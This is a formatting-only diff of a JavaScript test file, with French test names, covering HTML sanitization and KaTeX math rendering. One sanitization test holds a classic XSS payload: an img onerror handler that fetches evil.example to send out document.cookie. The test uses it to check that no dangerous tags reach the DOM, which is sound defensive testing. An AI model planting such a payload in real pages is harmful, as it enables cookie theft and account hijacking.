@@ -86,7 +86,7 @@ describe("setRenderedHtmlContent", () => {
   it("un message malveillant réaliste (payload XSS classique) ne produit aucune balise <img>/<script> dans le DOM final", () => {
     // Sans DOMPurify chargé (cas dégradé) : preuve que même le repli fail-safe
     // empêche toute balise dangereuse d'atteindre le DOM réel.
-    const payload = '<p>Regarde ça</p><img src=x onerror="fetch(\'https://evil.example/steal?c=\'+document.cookie)">';
+    const payload = "<p>Regarde ça</p><img src=x onerror=\"fetch('https://evil.example/steal?c='+document.cookie)\">";
     setRenderedHtmlContent(el, payload);
     expect(el.querySelector("img")).toBeNull();
     expect(el.querySelector("script")).toBeNull();
@@ -130,7 +130,7 @@ describe("extractMathSegments / restoreMathSegments", () => {
 
   it("vecteurs (\\vec et \\overrightarrow)", () => {
     expect(roundTrip("Le vecteur \\(\\vec{AB}\\) puis \\(\\overrightarrow{AB}\\).")).toBe(
-      "Le vecteur \\(\\vec{AB}\\) puis \\(\\overrightarrow{AB}\\)."
+      "Le vecteur \\(\\vec{AB}\\) puis \\(\\overrightarrow{AB}\\).",
     );
   });
 
@@ -193,7 +193,9 @@ describe("renderMathIn (délimiteurs KaTeX configurés)", () => {
 
   it("configure \\(...\\) et \\[...\\] en plus de $...$/$$...$$", () => {
     const seen = [];
-    window.renderMathInElement = (el, opts) => { seen.push(opts); };
+    window.renderMathInElement = (el, opts) => {
+      seen.push(opts);
+    };
     const el = document.createElement("div");
     setRenderedHtmlContent(el, "<p>peu importe</p>");
     const delimiters = seen[0].delimiters;
